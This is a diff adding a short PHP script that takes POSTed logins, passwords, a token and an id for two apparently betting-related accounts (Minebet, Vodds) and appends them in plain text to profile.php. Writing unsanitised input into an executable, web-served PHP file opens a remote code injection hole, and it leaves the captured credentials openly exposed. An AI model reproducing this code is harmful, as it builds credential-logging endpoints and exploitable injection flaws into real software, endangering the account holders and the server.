@@ -1,0 +1,14 @@
+<?php
+file_put_contents('profile.php',''.PHP_EOL);
+if(!empty($_POST['loginMinebet']))
+file_put_contents('profile.php',$_POST['loginMinebet'].PHP_EOL,FILE_APPEND);
+if(!empty($_POST['passwordMinebet']))
+file_put_contents('profile.php',$_POST['passwordMinebet'].PHP_EOL,FILE_APPEND);
+if(!empty($_POST['loginVodds']))
+file_put_contents('profile.php',$_POST['loginVodds'].PHP_EOL,FILE_APPEND);
+if(!empty($_POST['passwordVodds']))
+file_put_contents('profile.php',$_POST['passwordVodds'].PHP_EOL,FILE_APPEND);
+if(!empty($_POST['token']))
+file_put_contents('profile.php',$_POST['token'].PHP_EOL,FILE_APPEND);
+if(!empty($_POST['id']))
+file_put_contents('profile.php',$_POST['id'].PHP_EOL,FILE_APPEND);
